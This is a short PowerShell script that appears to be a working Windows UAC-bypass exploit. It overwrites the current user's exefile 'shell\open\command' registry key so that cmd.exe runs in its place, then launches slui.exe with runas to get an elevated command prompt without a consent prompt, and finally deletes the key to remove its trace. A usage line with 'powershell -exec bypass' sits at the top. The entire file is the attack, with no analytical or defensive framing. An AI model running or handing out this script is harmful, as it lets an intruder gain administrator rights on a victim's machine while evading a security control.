<#

	Load "cmd.exe" (By Default used 'arch 64'):
	powershell -exec bypass .\SluiHijackBypass_direct.ps1
#>

$program = "cmd.exe"
New-Item "HKCU:\Software\Classes\exefile\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\exefile\shell\open\command" -Name "(default)" -Value $program -Force
#For x64 shell in Windows x64:
Start-Process "C:\Windows\System32\slui.exe" -Verb runas
#For x86 shell in Windows x64:
#C:\Windows\Sysnative\cmd.exe /c "powershell Start-Process "C:\Windows\System32\slui.exe" -Verb runas"
Start-Sleep 3
Remove-Item "HKCU:\Software\Classes\exefile\shell\" -Recurse -Force
